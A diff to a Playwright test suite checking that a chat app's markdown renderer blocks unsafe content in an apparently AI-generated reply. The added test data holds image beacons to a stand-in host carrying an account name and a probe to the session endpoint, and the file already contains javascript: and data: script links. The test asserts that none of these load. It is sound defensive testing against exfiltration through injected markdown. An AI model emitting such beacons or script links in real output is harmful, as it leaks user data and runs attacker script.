@@ -383,6 +383,10 @@ test.describe('Markdown rendering', () => {
     '',
     '[Order history](/orders)',
     '',
+    '![External beacon](https://security-audit.invalid/pixel?account=CalderPike)',
+    '![Protocol-relative beacon](//security-audit.invalid/pixel?account=CalderPike)',
+    '![Local request](/api/auth/session?markdown-image-probe=true)',
+    '',
     `[Unsafe script](javascript:document.title='${executionMarker}')`,
     '',
     `[Unsafe document](data:text/html,%3Cscript%3Edocument.title%3D%27${executionMarker}%27%3C%2Fscript%3E)`,
@@ -397,9 +401,19 @@ test.describe('Markdown rendering', () => {
   test.use({ modelReply: markdownReply });
 
   test('renders formatted replies while blocking executable HTML and unsafe links, including after reload', async ({
+    page,
     supportPage,
     app,
   }) => {
+    const imageRequests: string[] = [];
+    await page.route('https://security-audit.invalid/**', async (route) => {
+      imageRequests.push(route.request().url());
+      await route.abort();
+    });
+    await page.route('**/*markdown-image-probe=true', async (route) => {
+      imageRequests.push(route.request().url());
+      await route.abort();
+    });
     const initialTitle = await supportPage.title();
     const prompt = 'Show a formatted support checklist.';
     await supportPage.startIncident();
@@ -433,6 +447,8 @@ test.describe('Markdown rendering', () => {
       await expect(message.link('Unsafe script')).toHaveAttribute('href', '');
       await expect(message.link('Unsafe document')).toHaveAttribute('href', '');
       await expect(message.embeddedHtml).toHaveCount(0);
+      await expect(message.bubble.locator('img')).toHaveCount(0);
+      expect(imageRequests).toEqual([]);
       expect(await supportPage.title()).toBe(initialTitle);
       await expect(message.bubble).not.toContainText(executionMarker);
     };
